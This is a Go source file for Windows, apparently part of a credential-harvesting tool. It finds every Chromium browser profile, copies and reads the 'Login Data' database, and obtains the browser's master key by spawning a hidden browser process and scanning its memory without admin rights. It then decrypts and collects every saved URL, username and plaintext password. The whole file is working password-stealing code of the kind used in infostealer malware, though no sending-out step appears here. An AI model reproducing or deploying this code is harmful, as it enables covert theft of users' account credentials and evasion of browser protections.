//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
)

// kernel32dll is shared with memkey_windows.go.
var kernel32dll = syscall.NewLazyDLL("kernel32.dll")

// ── Password decryption ───────────────────────────────────────────────────────

func decryptPassword(key, ciphertext []byte) (string, error) {
	if len(ciphertext) == 0 {
		return "", nil
	}
	if len(ciphertext) < 3 {
		return "", fmt.Errorf("ciphertext too short")
	}
	prefix := string(ciphertext[:3])
	if prefix != "v10" && prefix != "v20" {
		return "", fmt.Errorf("unknown ciphertext format")
	}
	if len(ciphertext) < 15 {
		return "", fmt.Errorf("ciphertext too short")
	}
	if key == nil {
		return "", fmt.Errorf("no AES key")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	plain, err := gcm.Open(nil, ciphertext[3:15], ciphertext[15:], nil)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// ── Per-browser password scan ─────────────────────────────────────────────────

// scanChromiumPasswords reads saved passwords for one browser profile.
// cachedKey is shared across all profiles of the same browser so we only
// spawn the hidden browser process once per installation.
func scanChromiumPasswords(b chromiumBrowser, profile string, cachedKey *[]byte) ([]PasswordEntry, error) {
	dbPath := filepath.Join(b.userDataDir, profile, "Login Data")
	if _, err := os.Stat(dbPath); err != nil {
		return nil, nil
	}
	tmp, err := tempCopy(dbPath)
	if err != nil {
		return nil, fmt.Errorf("copy failed: %w", err)
	}
	defer os.Remove(tmp)

	db, err := newSQLiteReader(tmp)
	if err != nil {
		return nil, fmt.Errorf("open sqlite: %w", err)
	}
	rows, err := db.ReadTable("logins")
	if err != nil {
		return nil, fmt.Errorf("read logins: %w", err)
	}

	// Fetch the master key once per browser (shared via cachedKey pointer).
	// Uses spawn-hidden-browser + heap scan; no admin required.
	if *cachedKey == nil {
		for _, row := range rows {
			if len(row) < 6 {
				continue
			}
			blob, _ := row[5].([]byte)
			if len(blob) >= 3 && (string(blob[:3]) == "v10" || string(blob[:3]) == "v20") {
				if k, err := getKeyFromBrowserMemory(b.name, blob); err == nil {
					*cachedKey = k
				}
				break
			}
		}
	}

	source := b.name
	if profile != "Default" {
		source = fmt.Sprintf("%s (%s)", b.name, profile)
	}

	var entries []PasswordEntry
	for _, row := range rows {
		if len(row) < 6 {
			continue
		}
		originURL, _ := row[0].(string)
		username, _ := row[3].(string)
		pwdBlob, _ := row[5].([]byte)
		if originURL == "" {
			continue
		}
		password, err := decryptPassword(*cachedKey, pwdBlob)
		if err != nil {
			password = "[decrypt failed]"
		}
		entries = append(entries, PasswordEntry{
			URL:      originURL,
			Username: username,
			Password: password,
			Source:   source,
		})
	}
	return entries, nil
}

// ── scanAllPasswords ──────────────────────────────────────────────────────────

func scanAllPasswords(env envPaths) ([]PasswordEntry, []string) {
	var (
		all    []PasswordEntry
		errors []string
	)

	for _, b := range resolvedChromiumBrowsers(env) {
		if _, err := os.Stat(b.userDataDir); err != nil {
			continue
		}
		// cachedKey is shared across all profiles of this browser so we only
		// spawn the hidden instance once per browser installation.
		var cachedKey []byte
		for _, profile := range profilesInUserData(b.userDataDir) {
			entries, err := scanChromiumPasswords(b, profile, &cachedKey)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s/%s passwords: %v", b.name, profile, err))
				continue
			}
			all = append(all, entries...)
		}
	}

	domainKey := func(rawURL string) string {
		s := rawURL
		if i := strings.Index(s, "://"); i >= 0 {
			s = s[i+3:]
		}
		return strings.ToLower(strings.TrimPrefix(s, "www."))
	}
	sort.Slice(all, func(i, j int) bool {
		return domainKey(all[i].URL) < domainKey(all[j].URL)
	})

	return all, errors
}
